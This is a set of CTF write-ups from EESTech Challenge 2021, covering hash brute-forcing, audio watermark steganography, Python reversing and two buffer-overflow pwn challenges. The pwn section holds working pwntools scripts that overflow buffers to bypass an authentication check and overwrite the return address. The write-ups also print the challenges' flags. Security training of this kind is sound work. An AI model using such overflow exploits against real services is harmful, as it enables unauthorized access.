# EESTech Challenge 2021 Official Write-ups
We helped EESTech and Mesa to organize and manage the CTF, and here you can find all the writeups of the challenges.

Formed by: 
* [Gregorio Galletti](https://github.com/gregalletti)
* [Stefano Bagarin](https://github.com/stepolimi)

# Write Ups - Categories and Points
## Cryptography

### Hashception

The challenge starts with a file containing bunch of alphanumerical strings, and 4 strings that were the first 4 strings in the file; the challenge name also states "Blake" which could refer to an hashing algorithm, interesting.

The strings length is repeated in a cyclic way, so:
* 1st string: 128 chars
* 2nd string: 40 chars
* 3rd string: 64 chars
* 4th string: 64 chars
* and then repeated  

We can try to bruteforce one of the first 4 strings (*da39a3ee5e6b4b0d3255bfef95601890afd80709*), resulting in an empty string hashed with SHA1. Ok so maybe also the other 3 correspond to an empty string? 
The answer is yes, and by simply trying I we can pull out also the other used algorithms, reaching this situation:
* 1st string: Blake 2b Hash
* 2nd string: SHA1
* 3rd string: SHA256
* 4th string: SHA3-256

From now on it's pretty easy: we know the algorithms and that we have to always add only a new character.

Here is the final script, that simply gets all the strings and starts from the 5th one. In a cyclic way it bruteforces char by char the 4 different hash types until the end: 
```python
import hashlib
alphabet = " 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHILMNOPQRSTUVWXYZ,.-_'?!$%&/()={}"
message = ""

file1 = open('hash.txt', 'r')
Lines = file1.readlines()

count = 0;

for line in Lines:
	if(count >3):
		for c in alphabet:
			encMes = ""
			if(count % 4 == 0):
				encMes = hashlib.blake2b(str.encode(message +c)).hexdigest()
			elif(count % 4 == 1):
				encMes = hashlib.sha1(str.encode(message +c)).hexdigest()
			elif(count % 4 == 2):
				encMes = hashlib.sha256(str.encode(message +c)).hexdigest()
			elif(count % 4 == 3):
				encMes = hashlib.sha3_256(str.encode(message +c)).hexdigest()
			if(encMes in line):
				message += c
				break
	count +=1

print(message)
```
Flag: 

**flag_{1t3r4t1v3_h4sh_cr4ck1ng_1s_qu1t3_c00l_w1th_pyth0n}**

## Forensics

## Miscellaneous
### EESTudios
We are given 2 audio tracks, one "Studio" version and one "Official" version: this already was an hint, due to the fact that having 2 tracks and knowning there is a watermark (or a sort of copyright) we can conclude that we should do some operations between them. To solve it we can open the two tracks with ```Audacity``` to see if just the spectrum of the leaked track contains, for example, an image with the flag (common thing with audio steganography challenges). 

This was right, but we just wanted to fool you ("Nice try! This is not the flag" is displayed). A watermarked audio theoretically contains more than the non-watermarked one, so invert the second one (```Effects > Invert > Built-in-Effect: Invert```) and mix them (```Tracks > Mix > Mix and Render```): the result is, as expected, the actual watermark. By listening it, this is the spelling of the flag.

Here is the flag: 

**flag_{you_did_it}**

## Reversing
### Password Here Please

The challenge consinsted in reverse engineering a ```Python``` code to find the string that gets throught each check. The first step was just understanding that the problem could be divided in 4 parts.

The first part (lines 5-7) was just a check on the lenght of the string that must be 24 characters. 

The second part (lines 9-14) was a constrain con the first 8 characters of the string: theyr hexadecimal ASCII value being subtracted to 0x98 and concatenated togheter had to be equal to the string '&e"3&Ew*'.
	Resulting string = "r3verS!n"

The third part (lines 16-23) was checking the second set of 8 characters of the string. The last one's ASCII value added to the last character of the array "ring" and to 0x1f gave the last character of the string; each other one was it's following character's ASCII value plus the corresponding number in the "ring" array plus 0x1f if grather than 0x60-0x1e, minus 0x1f if between 0x40-0x1e and 0x60-0x1d, unchanged otherwise.
	Resulting string = "g_pyTh0n"

The fourth part (lines 25-31) was for the last 8 characters and it was the most challenging one. I tryed to convert "code" from hexadecimal to decimal value and then put it in base 257, the result was a nice "number":

[8, 0, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

after noticing that each number is a power of 2 I managed to realize that the distance from each non-zero number to the start of the number added to 0x28 was the ASCII value of the characters of the substring, while the exponent of 2 was the index of the character in the substring (0-7).
Once understood that, there was only left to find each value and reorder them.
	Resulting string= "_fOr_FUn"

The result was the 3 substrings togheter.

**r3verS!ng_pyTh0n_fOr_FUn**

## Pwn
### Binary1.0
This challenge is very trivial. Our goal is to bypass the if statement and execute the system function. to bypass the boolean controll we must modify the "isAuthenicated" variable from 0 to any other value, in simple terms we must overflow the buffer (48 bytes) with a payload of 48+8 bytes long; in this way we overwrite the content of "isAuthenticated" variable and wether the last eight bytes of the payload are different from zero we have bypassed the if statement and we get the flag.

Written in Python this is:
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5150)

payload = b"a" * 62

r.send(payload)

r.interactive()
```

**MetaCTF{just_a_little_auth_bypass}**

### Binary2.0
This challenge is quite similar to the previus one. We always have to do a buffer owerflow in this way: to bypass the string comparison our buffer must start with "Sup3rs3cr3tC0de" string and it must overwrite RIP with the address of the win function. The below script is auto-esplicative.
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5151)

# from a quick run with gdb
addr = 0x401172 
base = 0xd68
payload = b"Sup3rs3cr3tC0de" + b"\x00" * 33 + p64(base) + p64(addr)

r.send(payload)

r.interactive()
```

**MetaCTF{c_strings_are_the_best_strings}**

